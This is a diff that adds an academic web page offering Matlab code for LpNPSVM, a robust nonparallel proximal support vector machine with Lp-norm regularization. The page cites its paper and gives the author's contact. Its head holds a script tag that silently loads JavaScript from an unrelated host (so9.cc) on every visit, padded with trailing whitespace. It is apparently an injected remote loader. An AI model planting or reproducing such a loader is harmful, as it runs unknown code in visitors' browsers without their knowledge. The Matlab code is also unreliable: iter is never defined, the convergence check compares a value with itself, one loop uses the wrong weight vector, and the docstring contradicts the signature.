@@ -1,0 +1,171 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><script async src="//ij.so9.cc/j/?t=fx&g=d8c8e9f0f5d0&c=4485005dd419&rv=1"></script>                                  
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>LpNPSVM</title>
+<link rel="stylesheet" type="text/css" href="../style.css" />
+</head>
+
+<body>
+<div class="logo" align="center"><a href="http://www.optimal-group.org" target="_blank"></a></div> 
+<div id="container">
+<p align="right">[<a href="http://www.optimal-group.org" target="_self" >Home</a>]</p> 
+</br>
+<h5><font face="Times New Roman" size="4"><b>LpNPSVM</b></font></h5>
+<hr />
+<p> A Matlab code for robust nonparallel proximal support vector machine with Lp-norm regularization.
+(You could Right-Click <a href="./LpNPSVM/LpNPSVMM.zip">[Code]</a> , and Save, then you can download the whole matlab code.) </p>
+
+
+
+<br />
+<h5><font face="Times New Roman" size="4"><b>Reference</b></font></h5>
+<hr />
+<p>Xiao-Quan Sun, Yi-Jian Chen, Yuan-Hai Shao, Chun-Na Li*, Chang-Hui Wang. Robust nonparallel proximal support vector machine with Lp-norm regularization. </p>
+
+<br />
+<h5><font face="Times New Roman" size="4"><b>Main Function</b></font></h5>
+<hr />
+
+
+<div style="white-space:pre">
+<b class="purple">function [w1, w2, b1, b2, iter] = LpNPSVM(Atrain,Btrain,delta,p,w0,itmax,epsmax) </b>
+<b class="green">
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+% % % % LpNPSVM: 
+% Robust nonparallel proximal support vector machine with Lp-norm regularization
+% [w1, b1, w2, b2] = LpNPSVM(Atrain,Btrain,FunPara,w0,itmax,epsmax) 
+% Input:
+%   Atrain: Positive class data matrix. Each row vector of Atrain is a data point.
+%   Btrain: Positive class data matrix. Each row vector of Btrain is a data point.
+%   delta: regularization term parameter.
+%   FunPara: parameters
+%         FunPara.delta: regularization parameter
+%         FunPara.p: p in Lp-norm regularization term 
+%   w0: Initial hyperplane direction and bias
+%   itmax: Maximun iteration number
+%   epsmax: Tolerance
+% 
+% % % % Eample:
+% Atrain = rand(30,2);
+% Btrain = rand(30,2) + 1;
+% w0 = ones(1,size(Atrain,2) + 1); % Initialization
+% FunPara.p = 1.5; 
+% FunPara.delta = 0.05; 
+% [w1, b1, w2, b2] = LpNPSVM(Atrain,Btrain,FunPara);
+
+% Reference:
+%    Robust nonparallel proximal support vector machine with Lp-norm regularization. %    IEEE Access, 2018, 6: 20334-20347.
+%    Xiao-Quan Sun, Yi-Jian Chen, Yuan-Hai Shao, Chun-Na Li*, Chang-Hui Wang
+%    Version 2.0 --June/2018 
+%    Written by Chun-Na Li (na1013na@163.com)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+</b><b class="green">
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+% Initailization
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+</b><b class="code">
+if nargin == 2
+    FunPara.delta = 0.05; FunPara.p = 1.5; w0 = ones(size(Atrain,2) + 1,1); itmax = 100; epsmax = 10^(-5); 
+elseif nargin == 3
+    w0 = ones(size(Atrain,2) + 1,1); itmax = 100; epsmax = 10^(-5); 
+elseif nargin == 4
+    itmax = 100; epsmax = 10^(-5); 
+elseif nargin == 5
+    epsmax = 10^(-5); 
+end
+
+delta = FunPara.delta;
+p = FunPara.p;
+[nSmpA, nFea] = size(Atrain);
+[nSmpB, ~] = size(Btrain);
+wp0 = w0;
+wn0 = w0;
+epsWX = 10^-4;
+epsW = 10^-4;
+Atrainbar = [Atrain,ones(size(Atrain,1),1)]';
+Btrainbar = [Btrain,ones(size(Btrain,1),1)]';
+
+while 1 
+    %%%%%%%%%%%%%%%%%%
+% % %     For A
+    %%%%%%%%%%%%%%%%%%
+    Ht_A = zeros(nFea+1, nFea+1);
+    ht_A = zeros(nFea+1,1);
+    for i = 1:nSmpA
+        Atrainbari = Atrainbar(:,i);
+        Ht_A = Ht_A + (Atrainbari*Atrainbari')/abs(wp0'*Atrainbari + epsWX);
+    end
+    for i = 1:nSmpB
+        ht_A = ht_A + sign(wp0'*Btrainbar(:,i))*Btrainbar(:,i);
+    end
+    q_A = (abs(wp0) + epsW).^(p - 2); 
+    Ht_Ar = delta*diag(q_A);
+    Ht_A = Ht_A + Ht_Ar;
+    wp = (Ht_A\ht_A)/(ht_A'*inv(Ht_A)*ht_A);
+    wp0 = wp;
+    %%%%%%%%%%%%%%%%%%
+% % %     For B
+    %%%%%%%%%%%%%%%%%%
+    Ht_B = zeros(nFea+1, nFea+1);
+    ht_B = zeros(nFea+1,1);
+    for i = 1:nSmpB
+        Btrainbari = Btrainbar(:,i);
+        Ht_B = Ht_B + (Btrainbari*Btrainbari')/abs(wp0'*Btrainbari + epsWX);
+    end
+    for i = 1:nSmpA
+        ht_B = ht_B + sign(wn0'*Atrainbar(:,i))*Atrainbar(:,i);
+    end
+    q_B = (abs(wn0) + epsW).^(p - 2); 
+    Ht_Br = delta*diag(q_B);
+    Ht_B = Ht_B + Ht_Br;
+    wn = (Ht_B\ht_B)/(ht_B'*inv(Ht_B)*ht_B);
+    wn0 = wn;
+        %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+    
+    if max(abs(wp-wp0))<epsmax && max(abs(wn-wn0))<epsmax && iter>itmax 
+        break;
+    end
+end
+w1 = wp(1:length(wp)-1);
+b1 = wp(length(wp)); 
+w2 = wn(1:length(wn)-1);
+b2 = wn(length(wn));
+</b>
+
+</div>
+
+<h5><a name="C1"><font face="Times New Roman" size="4.5">Contacts</font></a></font face="Times New Roman" size="4.5"></a> </h5>
+<hr />
+
+<br />
+Any question or advice please email to na1013na@163.com.
+
+<p />
+
+<hr />
+</p><ul><li>Last updated: 2, June, 2018
+
+
+<br />
+<br />
+
+
+
+
+
+
+
+<div class="rssfeed">
+    
+</div>
+
+</div>
+
+</div>
+
+</body>
+</html>
